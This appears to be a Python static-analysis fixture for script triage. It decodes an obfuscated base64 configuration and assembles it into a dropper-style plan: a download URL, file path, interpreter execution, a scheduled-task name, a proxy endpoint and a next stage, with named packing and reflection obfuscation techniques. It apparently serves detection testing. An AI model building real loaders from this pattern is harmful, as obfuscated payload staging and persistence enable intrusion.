#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_75681f6b = ("YikeaF9gUVxfKVxeW1JVWFFLVFtfYBhNT11hVV5RS15RWVtgURhQUU9bUFFLUVlOUVBQUVAYY15VYFFLUlVYURhQVV9cTWBPVEtcXltPUV9faE1QTVxgUV4pT1lQS1xlYFRbWktUTVpQW1JSaF9gTVNRS09bYVpgKSFoX2VaYE1kKVBVT2BVW1pNXmVLUFVfXE1gT1RoW05SY"

    "V9PTWBVW1opXlFSWFFPYFViUUtaTVlRS1xYTVpoT01eXlVRXilcZU1eWVteS1xlVVpfYE1YWFFeaGNVWlBbY19LT1RNVVopXFtjUV5fVFFYWEtgW0tcZWBUW1poT01ZXE1VU1pLVVApT01ZXE1VU1oZIE0lHh0gIh9SUmhhXlgpVGBgXF8mGxsgTSUeHSAiH1JSGlFkTVlcWF"

    "EaVVpiTVhVUBscJSQhJCEjIxpcZWhhX1FeS01TUVpgKTRhWmBeUV9fPGVgVFtaGyBNJR4dICIfUlJoUlVYUUtcTWBUKS8mGzxeW1NeTVkwTWBNGzRhWmBeUV9fOE1OGxphXFBNYFEZIE0lHh0gIh9SUhpcZWhVWmBRXlxeUWBRXktcTWBUKS8mGzxeW1NeTVkwTWBNGzxlYFR"

    "bWhkgTSUeHSAiH1JSG1xlYFRbWhpRZFFoYE1fV0taTVlRKT9lX2BRWUFcUE1gURkgTSUeHSAiH1JSaFxeW2RlS1FaUFxbVVpgKR0eIxocGhwaHSYeJRwlHGhaUWRgS19gTVNRKVhbT01YGVBVX1xNYE9UGk5NYGhUTVpQW1JSS1VQKTw/PEUZIx0jLSUdJS4uMRwxMh4iMQ==")

CODEC_75681f6b = "base64_chunks|subtract_modulo_256|14"



def load_75681f6b():

    return base64.b64decode(MATERIAL_75681f6b)



def decode_75681f6b(stored_bytes):

    return bytes((value + 20) % 256 for value in stored_bytes)



def recover_75681f6b():

    harmless_value = "left" if 2 > 1 else "right"

    try:

        recovered_bytes = decode_75681f6b(load_75681f6b())

    except (TypeError, ValueError) as error:

        raise RuntimeError("configuration recovery failed") from error

    configuration_text = recovered_bytes.decode("ascii", "strict")

    return configuration_text



def inspect_75681f6b():

    return recover_75681f6b()



def surface_75681f6b():

    routes = {"selected": lambda: ("dictionary_dispatch", "reflective_name_plan", "pyarmor_pyinstaller", "powershell_to_python")}

    return routes["selected"]()



def obfuscation_75681f6b():

    reflection_plan = ("__import__", "getattr", "reflective_name_plan")

    return reflection_plan[-1]



def plan_75681f6b():

    fields = dict(item.split("=", 1) for item in inspect_75681f6b().split("|"))

    analysis_surface = surface_75681f6b()

    obfuscation_surface = obfuscation_75681f6b()

    operation_plan = ("cmd_python_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_75681f6b())

